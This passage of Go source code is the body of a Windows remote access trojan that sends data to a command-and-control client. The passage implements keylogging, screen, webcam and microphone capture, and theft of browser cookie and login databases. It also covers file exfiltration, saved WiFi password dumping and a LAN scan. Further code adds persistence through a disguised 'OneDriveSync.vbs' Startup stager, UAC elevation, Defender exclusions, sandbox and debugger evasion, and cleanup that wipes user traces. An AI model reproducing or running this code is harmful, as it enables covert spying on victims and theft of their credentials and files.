	bmi.SizeImage = imageSize
	pixels := make([]byte, imageSize)
	ret, _, _ = pGetDIBits.Call(hdcMem, hBitmap, 0, uintptr(height), uintptr(unsafe.Pointer(&pixels[0])), uintptr(unsafe.Pointer(&bmi)), 0)
	if ret == 0 {
		return nil, fmt.Errorf("GetDIBits failed")
	}
	var buf bytes.Buffer
	buf.Write([]byte{'B', 'M'})
	binary.Write(&buf, binary.LittleEndian, uint32(54+imageSize))
	binary.Write(&buf, binary.LittleEndian, uint16(0))
	binary.Write(&buf, binary.LittleEndian, uint16(0))
	binary.Write(&buf, binary.LittleEndian, uint32(54))
	binary.Write(&buf, binary.LittleEndian, uint32(40))
	binary.Write(&buf, binary.LittleEndian, int32(width))
	binary.Write(&buf, binary.LittleEndian, int32(height))
	binary.Write(&buf, binary.LittleEndian, uint16(1))
	binary.Write(&buf, binary.LittleEndian, uint16(24))
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	binary.Write(&buf, binary.LittleEndian, imageSize)
	binary.Write(&buf, binary.LittleEndian, int32(0))
	binary.Write(&buf, binary.LittleEndian, int32(0))
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	buf.Write(pixels)
	return buf.Bytes(), nil
}

// ================================================================
// KEYLOGGER
// ================================================================

func getActiveWindowTitle() string {
	hwnd, _, _ := pGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	var title [256]uint16
	pGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&title[0])), 256)
	return windows.UTF16PtrToString(&title[0])
}

func vkToString(vk int, shiftPressed bool) string {
	specials := map[int]string{
		8: "[BS]", 9: "[TAB]", 13: "[ENT]", 16: "", 17: "", 18: "", 20: "[CAPS]",
		27: "[ESC]", 32: " ", 37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
		45: "[INS]", 46: "[DEL]", 91: "[WIN]",
		112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
		116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
		120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
		160: "", 161: "", 162: "", 163: "", 164: "", 165: "",
	}
	if s, ok := specials[vk]; ok {
		return s
	}
	kbState := make([]byte, 256)
	pGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
	if shiftPressed {
		kbState[16] = 0x80
	}
	sc, _, _ := pMapVirtualKeyW.Call(uintptr(vk), 0)
	var charBuf [8]uint16
	ret, _, _ := pToUnicode.Call(
		uintptr(vk),
		sc,
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&charBuf[0])),
		8,
		0,
	)
	if int32(ret) > 0 {
		return windows.UTF16PtrToString(&charBuf[0])
	}
	return ""
}

func keyloggerJob(ctx context.Context, c2 *C2Client) {
	var buf strings.Builder
	var title string
	lastFlush := time.Now()
	var prevState [256]bool
	for {
		select {
		case <-ctx.Done():
			if buf.Len() > 0 {
				c2.SendKeylog(buf.String(), title)
			}
			return
		default:
		}
		for vk := 8; vk <= 254; vk++ {
			state, _, _ := pGetAsyncKeyState.Call(uintptr(vk))
			isDown := state&0x8000 != 0

			if isDown && !prevState[vk] {
				shiftState, _, _ := pGetAsyncKeyState.Call(uintptr(16))
				shiftPressed := shiftState&0x8000 != 0

				ch := vkToString(vk, shiftPressed)
				if ch != "" {
					if buf.Len() == 0 {
						lastFlush = time.Now()
					}
					buf.WriteString(ch)
					title = getActiveWindowTitle()
				}
			}

			prevState[vk] = isDown
		}
		if time.Since(lastFlush) > 5*time.Second && buf.Len() > 0 {
			c2.SendKeylog(buf.String(), title)
			buf.Reset()
			lastFlush = time.Now()
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// ================================================================
// SCREENSHOT JOB
// ================================================================

func screenshotJob(ctx context.Context, c2 *C2Client) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if img, err := captureScreen(); err == nil {
			c2.SendScreenshot(img)
		}
		for i := 0; i < 300; i++ {
			select {
			case <-ctx.Done():
				return
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
	}
}

// ================================================================
// FFMPEG DOWNLOAD + MEDIA CAPTURE
// ================================================================

func getFFmpegPath() string {
	return filepath.Join(os.TempDir(), "ffmpeg.exe")
}

func downloadFFmpeg() (string, error) {
	p := getFFmpegPath()
	if _, err := os.Stat(p); err == nil {
		return p, nil
	}
	resp, err := http.Get("https://api.github.com/repos/GyanD/codexffmpeg/releases/latest")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var release struct {
		Assets []struct {
			Name               string `json:"name"`
			BrowserDownloadURL string `json:"browser_download_url"`
		} `json:"assets"`
	}
	json.Unmarshal(body, &release)
	var zipURL string
	for _, a := range release.Assets {
		if strings.Contains(a.Name, "essentials_build.zip") {
			zipURL = a.BrowserDownloadURL
			break
		}
	}
	if zipURL == "" {
		return "", fmt.Errorf("ffmpeg asset not found")
	}
	zipPath := filepath.Join(os.TempDir(), "ffmpeg.zip")
	zResp, err := http.Get(zipURL)
	if err != nil {
		return "", err
	}
	defer zResp.Body.Close()
	zFile, _ := os.Create(zipPath)
	io.Copy(zFile, zResp.Body)
	zFile.Close()
	zr, err := zip.OpenReader(zipPath)
	if err != nil {
		return "", err
	}
	defer zr.Close()
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "bin/ffmpeg.exe") || strings.HasSuffix(f.Name, "bin\\ffmpeg.exe") {
			rc, _ := f.Open()
			out, _ := os.Create(p)
			io.Copy(out, rc)
			rc.Close()
			out.Close()
			break
		}
	}
	os.Remove(zipPath)
	return p, nil
}

func webcamJob(ctx context.Context, c2 *C2Client) {
	ffmpeg, err := downloadFFmpeg()
	if err != nil {
		return
	}
	devOut, _ := shellExec(`wmic path Win32_PnPEntity where "PNPClass='Camera' or PNPClass='Image'" get Name /format:list 2>nul`)
	lines := strings.Split(devOut, "\n")
	var devName string
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if strings.HasPrefix(l, "Name=") {
			devName = strings.TrimPrefix(l, "Name=")
			break
		}
	}
	if devName == "" {
		return
	}
	imgPath := filepath.Join(os.TempDir(), "webcam.jpg")
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		shellExec(fmt.Sprintf(`"%s" -f dshow -i video="%s" -frames:v 1 -y "%s"`, ffmpeg, devName, imgPath))
		if data, err := os.ReadFile(imgPath); err == nil {
			c2.SendScreenshot(data) // reuse screenshot table for webcam too
		}
		os.Remove(imgPath)
		time.Sleep(10 * time.Second)
	}
}

func microphoneJob(ctx context.Context, c2 *C2Client) {
	ffmpeg, err := downloadFFmpeg()
	if err != nil {
		return
	}
	devOut, _ := shellExec(`wmic path Win32_SoundDevice get Name /format:list 2>nul`)
	lines := strings.Split(devOut, "\n")
	var devName string
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if strings.HasPrefix(l, "Name=") {
			devName = strings.TrimPrefix(l, "Name=")
			break
		}
	}
	if devName == "" {
		devName = "Microphone"
	}
	audioPath := filepath.Join(os.TempDir(), "audio.mp3")
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		shellExec(fmt.Sprintf(`"%s" -f dshow -i audio="%s" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 -y "%s"`, ffmpeg, devName, audioPath))
		if err := c2.SendFileChunked(audioPath); err == nil {
			os.Remove(audioPath)
		}
		time.Sleep(5 * time.Second)
	}
}

func recordScreenJob(ctx context.Context, c2 *C2Client, seconds int) {
	ffmpeg, err := downloadFFmpeg()
	if err != nil {
		return
	}
	vidPath := filepath.Join(os.TempDir(), "screen.mp4")
	shellExec(fmt.Sprintf(`"%s" -f gdigrab -framerate 10 -t %d -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart -y "%s"`, ffmpeg, seconds, vidPath))
	c2.SendFileChunked(vidPath)
	os.Remove(vidPath)
}

// ================================================================
// BROWSER EXFILTRATION
// ================================================================

func exfilBrowserData(c2 *C2Client) string {
	tmpDir := filepath.Join(os.TempDir(), "browserdb")
	os.MkdirAll(tmpDir, 0755)
	defer os.RemoveAll(tmpDir)

	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	browsers := map[string][]string{
		"chrome": {
			filepath.Join(localAppData, `Google\Chrome\User Data\Default\History`),
			filepath.Join(localAppData, `Google\Chrome\User Data\Default\Web Data`),
			filepath.Join(localAppData, `Google\Chrome\User Data\Default\Cookies`),
			filepath.Join(localAppData, `Google\Chrome\User Data\Default\Login Data`),
			filepath.Join(localAppData, `Google\Chrome\User Data\Local State`),
		},
		"edge": {
			filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\History`),
			filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\Web Data`),
			filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\Cookies`),
			filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\Login Data`),
			filepath.Join(localAppData, `Microsoft\Edge\User Data\Local State`),
		},
	}

	// Firefox uses profile directories
	ffProfiles := filepath.Join(appData, `Mozilla\Firefox\Profiles`)
	if entries, err := os.ReadDir(ffProfiles); err == nil {
		for _, e := range entries {
			if e.IsDir() && strings.Contains(e.Name(), ".default") {
				profDir := filepath.Join(ffProfiles, e.Name())
				browsers["firefox"] = []string{
					filepath.Join(profDir, "places.sqlite"),
					filepath.Join(profDir, "formhistory.sqlite"),
					filepath.Join(profDir, "cookies.sqlite"),
					filepath.Join(profDir, "logins.json"),
					filepath.Join(profDir, "key4.db"),
				}
				break
			}
		}
	}

	copied := 0
	for browser, files := range browsers {
		bDir := filepath.Join(tmpDir, browser)
		os.MkdirAll(bDir, 0755)
		for _, src := range files {
			if _, err := os.Stat(src); err != nil {
				continue
			}
			dst := filepath.Join(bDir, filepath.Base(src)+"_"+fmt.Sprintf("%d", mrand.Intn(10000)))
			data, err := os.ReadFile(src)
			if err != nil {
				continue
			}
			os.WriteFile(dst, data, 0644)
			copied++
		}
	}

	zipPath := filepath.Join(os.TempDir(), "browserdb.zip")
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("zip create error: %v", err)
	}
	w := zip.NewWriter(zipFile)
	filepath.Walk(tmpDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		relPath, _ := filepath.Rel(tmpDir, path)
		header, _ := zip.FileInfoHeader(info)
		header.Name = relPath
		writer, _ := w.CreateHeader(header)
		f, _ := os.Open(path)
		io.Copy(writer, f)
		f.Close()
		return nil
	})
	w.Close()
	zipFile.Close()
	c2.SendFileChunked(zipPath)
	os.Remove(zipPath)
	return fmt.Sprintf("Browser DB exfiltrated (%d files)", copied)
}

// ================================================================
// BROWSER DATA PARSER
// ================================================================

func extractURLsFromSQLite(data []byte) []string {
	re := regexp.MustCompile(`https?://[^\x00-\x1f\x7f-\x9f]{4,500}`)
	matches := re.FindAll(data, -1)
	seen := make(map[string]bool)
	var urls []string
	for _, m := range matches {
		s := string(m)
		// trim trailing junk chars common in SQLite pages
		s = strings.TrimRight(s, "\x00 \t\r\n")
		if idx := strings.IndexAny(s, "\x00\x01\x02\x03"); idx > 0 {
			s = s[:idx]
		}
		if !seen[s] && len(s) > 10 {
			seen[s] = true
			urls = append(urls, s)
		}
	}
	return urls
}

func extractLoginsFromSQLite(data []byte) []string {
	// Login Data stores origin_url and username_value as plaintext in SQLite records
	// Extract origin URLs paired with nearby text that looks like usernames
	re := regexp.MustCompile(`https?://[^\x00-\x1f\x7f-\x9f]{4,300}`)
	matches := re.FindAllIndex(data, -1)
	seen := make(map[string]bool)
	var entries []string

	for _, loc := range matches {
		url := strings.TrimRight(string(data[loc[0]:loc[1]]), "\x00 ")
		if idx := strings.IndexAny(url, "\x00\x01\x02\x03"); idx > 0 {
			url = url[:idx]
		}
		if len(url) < 10 {
			continue
		}

		// scan forward from end of URL for a username-like string (email or text)
		searchEnd := loc[1] + 500
		if searchEnd > len(data) {
			searchEnd = len(data)
		}
		chunk := data[loc[1]:searchEnd]

		emailRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]{2,64}@[a-zA-Z0-9.\-]{2,64}\.[a-zA-Z]{2,10}`)
		if emailMatch := emailRe.Find(chunk); emailMatch != nil {
			key := url + "|" + string(emailMatch)
			if !seen[key] {
				seen[key] = true
				entries = append(entries, fmt.Sprintf("  %s  |  %s", url, string(emailMatch)))
			}
		} else {
			// look for any printable text near the URL as potential username
			userRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]{3,40}`)
			for _, um := range userRe.FindAll(chunk[:min(len(chunk), 200)], 5) {
				s := string(um)
				// skip common SQLite/Chrome internal strings
				if strings.EqualFold(s, "CREATE") || strings.EqualFold(s, "TABLE") ||
					strings.EqualFold(s, "INDEX") || strings.EqualFold(s, "android") ||
					strings.EqualFold(s, "password") || strings.EqualFold(s, "username") ||
					strings.EqualFold(s, "signon_realm") || strings.EqualFold(s, "origin_url") ||
					strings.EqualFold(s, "action_url") || len(s) <= 3 {
					continue
				}
				key := url + "|" + s
				if !seen[key] {
					seen[key] = true
					entries = append(entries, fmt.Sprintf("  %s  |  %s", url, s))
				}
				break
			}
		}
	}
	return entries
}

func parseBrowserData() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	type browserInfo struct {
		name        string
		historyPath string
		loginPath   string
	}

	browsers := []browserInfo{
		{"Chrome", filepath.Join(localAppData, `Google\Chrome\User Data\Default\History`), filepath.Join(localAppData, `Google\Chrome\User Data\Default\Login Data`)},
		{"Edge", filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\History`), filepath.Join(localAppData, `Microsoft\Edge\User Data\Default\Login Data`)},
	}

	// Firefox
	ffProfiles := filepath.Join(appData, `Mozilla\Firefox\Profiles`)
	if entries, err := os.ReadDir(ffProfiles); err == nil {
		for _, e := range entries {
			if e.IsDir() && strings.Contains(e.Name(), ".default") {
				profDir := filepath.Join(ffProfiles, e.Name())
				browsers = append(browsers, browserInfo{"Firefox", filepath.Join(profDir, "places.sqlite"), filepath.Join(profDir, "logins.json")})
				break
			}
		}
	}

	var sb strings.Builder
	for _, b := range browsers {
		sb.WriteString(fmt.Sprintf("=== %s ===\n", b.name))

		// Parse history
		if data, err := os.ReadFile(b.historyPath); err == nil {
			urls := extractURLsFromSQLite(data)
			if len(urls) > 100 {
				urls = urls[:100]
			}
			sb.WriteString(fmt.Sprintf("\n[History - %d URLs]\n", len(urls)))
			sort.Strings(urls)
			for _, u := range urls {
				sb.WriteString("  " + u + "\n")
			}
		} else {
			sb.WriteString("\n[History] Not found\n")
		}

		// Parse logins
		if b.name == "Firefox" {
			// Firefox stores logins in JSON
			if data, err := os.ReadFile(b.loginPath); err == nil {
				sb.WriteString(fmt.Sprintf("\n[Saved Logins - raw JSON %d bytes]\n", len(data)))
				// Extract hostname and username fields from JSON
				type ffLogin struct {
					Hostname          string `json:"hostname"`
					EncryptedUsername string `json:"encryptedUsername"`
				}
				type ffLogins struct {
					Logins []ffLogin `json:"logins"`
				}
				var logins ffLogins
				if json.Unmarshal(data, &logins) == nil {
					for _, l := range logins.Logins {
						sb.WriteString(fmt.Sprintf("  %s  |  (encrypted)\n", l.Hostname))
					}
				}
			} else {
				sb.WriteString("\n[Saved Logins] Not found\n")
			}
		} else {
			// Chromium - Login Data is SQLite, extract URL/username pairs
			if data, err := os.ReadFile(b.loginPath); err == nil {
				entries := extractLoginsFromSQLite(data)
				sb.WriteString(fmt.Sprintf("\n[Saved Logins - %d entries]\n", len(entries)))
				for _, e := range entries {
					sb.WriteString(e + "\n")
				}
			} else {
				sb.WriteString("\n[Saved Logins] Not found\n")
			}
		}
		sb.WriteString("\n")
	}

	result := sb.String()
	if len(result) == 0 {
		return "No browser data found"
	}
	return result
}

// ================================================================
// FILE EXFILTRATION
// ================================================================

func exfilFiles(c2 *C2Client, basePath string, extensions []string, maxFileSize int64) string {
	if basePath == "" {
		return "Error: path is required. Specify the file or directory to exfiltrate."
	}
	if maxFileSize == 0 {
		maxFileSize = 50 * 1024 * 1024
	}

	// Check if basePath is a file
	info, err := os.Stat(basePath)
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	// Single file - just send it
	if !info.IsDir() {
		if err := c2.SendFile(basePath); err != nil {
			return fmt.Sprintf("Error sending file: %v", err)
		}
		return fmt.Sprintf("File sent: %s (%d bytes)", basePath, info.Size())
	}

	// Directory - zip it and send
	if len(extensions) == 0 {
		extensions = []string{} // empty = grab everything
	}

	zipPath := filepath.Join(os.TempDir(), "exfil.zip")
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "zip create error"
	}
	w := zip.NewWriter(zipFile)
	count := 0

	filepath.Walk(basePath, func(path string, fi os.FileInfo, err error) error {
		if err != nil || fi.IsDir() || fi.Size() > maxFileSize {
			return nil
		}
		if len(extensions) > 0 {
			ext := strings.ToLower(filepath.Ext(path))
			matched := false
			for _, e := range extensions {
				if ext == e {
					matched = true
					break
				}
			}
			if !matched {
				return nil
			}
		}
		relPath, _ := filepath.Rel(basePath, path)
		header, _ := zip.FileInfoHeader(fi)
		header.Name = relPath
		writer, _ := w.CreateHeader(header)
		f, fErr := os.Open(path)
		if fErr != nil {
			return nil
		}
		io.Copy(writer, f)
		f.Close()
		count++
		return nil
	})
	w.Close()
	zipFile.Close()

	if count > 0 {
		c2.SendFile(zipPath)
	}
	os.Remove(zipPath)
	return fmt.Sprintf("Exfiltrated %d files from %s", count, basePath)
}

// ================================================================
// WIFI + LAN ENUMERATION
// ================================================================

func getWifiProfiles() string {
	profiles, _ := shellExec("netsh wlan show profiles")
	passwords, _ := shellExec("netsh wlan show profiles * key=clear")
	return "=== SAVED PROFILES ===\n" + profiles + "\n=== PASSWORDS ===\n" + passwords
}

func getNearbyWifi() string {
	out, _ := shellExec("netsh wlan show networks mode=Bssid")
	return out
}

func scanLAN() string {
	// Determine subnet from local IP
	localIP := ""
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				localIP = ipnet.IP.String()
				break
			}
		}
		if localIP != "" {
			break
		}
	}
	if localIP == "" {
		return "No local IP found"
	}
	parts := strings.Split(localIP, ".")
	if len(parts) != 4 {
		return "Invalid IP format"
	}
	subnet := strings.Join(parts[:3], ".")

	// Ping sweep (fire and forget to populate ARP table)
	for i := 1; i <= 254; i++ {
		ip := fmt.Sprintf("%s.%d", subnet, i)
		go shellExec(fmt.Sprintf("ping -n 1 -w 100 %s", ip))
	}
	time.Sleep(5 * time.Second)

	// Read ARP table
	arp, _ := shellExec("arp -a")
	return fmt.Sprintf("Local IP: %s\nSubnet: %s.0/24\n\n%s", localIP, subnet, arp)
}

// ================================================================
// FOLDER TREE
// ================================================================

func getFolderTree() string {
	userProfile := os.Getenv("USERPROFILE")
	var result strings.Builder
	for _, dir := range []string{"Desktop", "Documents", "Downloads"} {
		out, _ := shellExec(fmt.Sprintf(`tree "%s" /A /F`, filepath.Join(userProfile, dir)))
		result.WriteString(fmt.Sprintf("=== %s ===\n%s\n\n", dir, out))
	}
	return result.String()
}

// ================================================================
// PERSISTENCE
// ================================================================

func addPersistence() string {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Executable path error: %v", err)
	}

	// Use Startup folder with a VBS stager — no registry keys, no file copies
	// VBS stager in Startup folder is less flagged than reg keys or exe copies
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	vbsPath := filepath.Join(startupDir, "OneDriveSync.vbs")

	// VBS stager that launches the original exe from its current location
	vbsContent := fmt.Sprintf("CreateObject(\"Wscript.Shell\").Run \"\"\"%s\"\"\", 0, False\r\n", exePath)

	os.MkdirAll(startupDir, 0755)
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return fmt.Sprintf("Startup folder error: %v", err)
	}

	return "Startup Installed"
}

func removePersistence() string {
	// Remove startup folder stager
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	os.Remove(filepath.Join(startupDir, "OneDriveSync.vbs"))
	// Also clean up legacy persistence if present
	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
	os.Remove(legacyPath)
	// Clean up stale COM hijack from removed DLL sideload feature
	cleanupStaleCOMHijack()
	return "Persistence removed"
}

// ================================================================
// UAC ELEVATION
// ================================================================

func elevate() string {
	if isAdmin() {
		return "Already running as admin — no elevation needed"
	}
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Failed to get executable path: %v", err)
	}
	verb, _ := windows.UTF16PtrFromString("runas")
	exe, _ := windows.UTF16PtrFromString(exePath)
	params, _ := windows.UTF16PtrFromString("")
	dir, _ := windows.UTF16PtrFromString("")
	ret, _, lastErr := pShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(verb)),
		uintptr(unsafe.Pointer(exe)),
		uintptr(unsafe.Pointer(params)),
		uintptr(unsafe.Pointer(dir)),
		0, // SW_HIDE
	)
	if ret > 32 {
		// Release the single-instance mutex so the elevated process can
		// acquire it, then exit this (non-admin) process.
		releaseSingleInstance()
		go func() {
			time.Sleep(2 * time.Second)
			os.Exit(0)
		}()
		return "UAC elevation successful — this session will exit, elevated session connecting"
	}
	return fmt.Sprintf("UAC elevation failed (code %d, err: %v) — user may have denied the prompt", ret, lastErr)
}

// ================================================================
// DEFENDER EXCLUSION
// ================================================================

func excludeDrive(drives []string) string {
	// Use MpCmdRun.exe directly — avoids PowerShell (heavily monitored by EDR/AV)
	mpCmdRun := filepath.Join(os.Getenv("ProgramFiles"), "Windows Defender", "MpCmdRun.exe")
	var results []string
	for _, d := range drives {
		out, err := shellExec(fmt.Sprintf(`"%s" -AddExclusion -ExclusionType Path -ExclusionPath "%s"`, mpCmdRun, d))
		if err != nil {
			results = append(results, fmt.Sprintf("%s: FAILED (%v)", d, err))
		} else {
			results = append(results, fmt.Sprintf("%s: OK (%s)", d, strings.TrimSpace(out)))
		}
	}
	return strings.Join(results, "\n")
}

// ================================================================
// INPUT BLOCKING
// ================================================================

func blockInput(block bool) string {
	var val uintptr
	if block {
		val = 1
	}
	ret, _, _ := pBlockInput.Call(val)
	if ret != 0 {
		if block {
			return "IO Disabled"
		}
		return "IO Enabled"
	}
	return "BlockInput failed (requires admin)"
}

// ================================================================
// VM + DEBUGGER + ANALYSIS DETECTION
// ================================================================

func detectVM() bool {
	_, triggers := detectVMDetails()
	// Only count non-VMware triggers (VMware products on host cause false positives)
	for _, t := range triggers {
		if !strings.Contains(t, "VMware") {
			return true
		}
	}
	return false
}

func detectVMDetails() (bool, []string) {
	var triggers []string
	mfr := regRead(HKLM, `HARDWARE\DESCRIPTION\System\BIOS`, "SystemManufacturer")
	model := regRead(HKLM, `HARDWARE\DESCRIPTION\System\BIOS`, "SystemProductName")
	for _, s := range []string{"VMware", "VirtualBox", "QEMU", "Xen", "innotek", "Bochs", "Virtual Machine"} {
		if strings.Contains(mfr, s) {
			triggers = append(triggers, fmt.Sprintf("bios_manufacturer=%q matched %q", mfr, s))
		}
		if strings.Contains(model, s) {
			triggers = append(triggers, fmt.Sprintf("bios_product=%q matched %q", model, s))
		}
	}
	vmMACNames := map[string]string{
		"\x00\x0c\x29": "VMware",
		"\x00\x50\x56": "VMware",
		"\x08\x00\x27": "VirtualBox",
		"\x00\x05\x69": "VMware",
		"\x00\x1c\x14": "VMware",
	}
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) >= 3 {
			prefix := string(iface.HardwareAddr[:3])
			if vendor, ok := vmMACNames[prefix]; ok {
				triggers = append(triggers, fmt.Sprintf("mac=%s iface=%q vendor=%s", iface.HardwareAddr, iface.Name, vendor))
			}
		}
	}
	return len(triggers) > 0, triggers
}

// isOnlyVMware returns true when all VM triggers are VMware-related.
// Bare-metal hosts with VMware Workstation/Player installed register VMware
// BIOS strings and MAC OUIs, so VMware-only triggers are treated as a
// false positive and execution continues.
func isOnlyVMware(triggers []string) bool {
	if len(triggers) == 0 {
		return false
	}
	for _, t := range triggers {
		if !strings.Contains(t, "VMware") {
			return false
		}
	}
	return true
}

func detectDebugger() bool {
	_, triggers := detectDebuggerDetails()
	return len(triggers) > 0
}

func detectDebuggerDetails() (bool, []string) {
	var triggers []string
	ret, _, _ := pIsDebuggerPresent.Call()
	if ret != 0 {
		triggers = append(triggers, "IsDebuggerPresent=true")
	}
	var isRemote int32
	proc, _ := windows.GetCurrentProcess()
	pCheckRemoteDebuggerPresent.Call(uintptr(proc), uintptr(unsafe.Pointer(&isRemote)))
	if isRemote != 0 {
		triggers = append(triggers, "CheckRemoteDebuggerPresent=true")
	}
	return len(triggers) > 0, triggers
}

func detectAnalysisTools() []string {
	targets := []string{"taskmgr.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe", "processhacker.exe", "wireshark.exe", "fiddler.exe", "x64dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe"}
	procs := getProcessList()
	var found []string
	for _, p := range procs {
		name := strings.ToLower(p["name"].(string))
		for _, t := range targets {
			if name == t {
				found = append(found, name)
			}
		}
	}
	return found
}

// ================================================================
// PRANK FUNCTIONS
// ================================================================

func sendMessage(msg string) string {
	m, _ := windows.UTF16PtrFromString(msg)
	t, _ := windows.UTF16PtrFromString("System Alert")
	pMessageBoxW.Call(0, uintptr(unsafe.Pointer(m)), uintptr(unsafe.Pointer(t)), uintptr(MB_OK|MB_ICONWARNING))
	return "Message sent"
}

func setWallpaper(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Sprintf("Download error: %v", err)
	}
	defer resp.Body.Close()
	imgPath := filepath.Join(os.TempDir(), "wallpaper.jpg")
	f, _ := os.Create(imgPath)
	io.Copy(f, resp.Body)
	f.Close()
	p, _ := windows.UTF16PtrFromString(imgPath)
	pSystemParametersInfoW.Call(SPI_SETDESKWALLPAPER, 0, uintptr(unsafe.Pointer(p)), uintptr(SPIF_UPDATEINIFILE|SPIF_SENDCHANGE))
	return "Wallpaper set"
}

func minimizeAll() string {
	pKeybdEvent.Call(uintptr(VK_LWIN), 0, 0, 0)
	pKeybdEvent.Call(0x44, 0, 0, 0) // D key
	time.Sleep(50 * time.Millisecond)
	pKeybdEvent.Call(0x44, 0, uintptr(KEYEVENTF_KEYUP), 0)
	pKeybdEvent.Call(uintptr(VK_LWIN), 0, uintptr(KEYEVENTF_KEYUP), 0)
	return "All windows minimized"
}

func setDarkMode(enable bool) string {
	val := "0"
	if !enable {
		val = "1"
	}
	regWrite(HKCU, `SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize`, "AppsUseLightTheme", val)
	regWrite(HKCU, `SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize`, "SystemUsesLightTheme", val)
	if enable {
		return "Dark mode enabled"
	}
	return "Dark mode disabled"
}

func shortcutBomb() string {
	desktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	for i := 0; i < 50; i++ {
		name := fmt.Sprintf("USB Hardware%d.lnk", mrand.Intn(99999))
		// Create a minimal .lnk file (shortcut)
		// Using cmd to create shortcuts without PowerShell
		shellExec(fmt.Sprintf(`cmd /c mklink "%s" "C:\Windows\System32\rundll32.exe" 2>nul`, filepath.Join(desktop, name)))
	}
	return "50 shortcuts created"
}

func fakeUpdate() string {
	shellExec(`cmd /c start chrome.exe --new-window --kiosk "https://fakeupdate.net/win8"`)
	return "Fake update sent"
}

func soundSpam() string {
	shellExec(`cmd /c for %%f in (C:\Windows\Media\*.wav) do @start /min "" "%%f"`)
	return "Sound spam sent"
}

// ================================================================
// CLEANUP
// ================================================================

func cleanup() string {
	var r strings.Builder
	// Clear temp files
	entries, _ := os.ReadDir(os.TempDir())
	rm := 0
	for _, e := range entries {
		p := filepath.Join(os.TempDir(), e.Name())
		if os.Remove(p) == nil {
			rm++
		}
	}
	r.WriteString(fmt.Sprintf("Removed %d temp files. ", rm))

	// PowerShell history
	psHist := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)
	if os.Remove(psHist) == nil {
		r.WriteString("PS history cleared. ")
	}

	// Run dialog MRU
	for _, v := range []string{"a", "b", "c", "d", "e", "f", "MRUList"} {
		regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, v)
	}
	r.WriteString("RunMRU cleared. ")

	// Recycle bin
	shellExec(`cmd /c rd /s /q %SYSTEMDRIVE%\$Recycle.Bin 2>nul`)
	r.WriteString("Recycle bin cleared.")
	return r.String()
}

// ================================================================
// ENCRYPTION UTILITIES
// ================================================================

func encryptData(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decryptData(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(ciphertext) < ns {
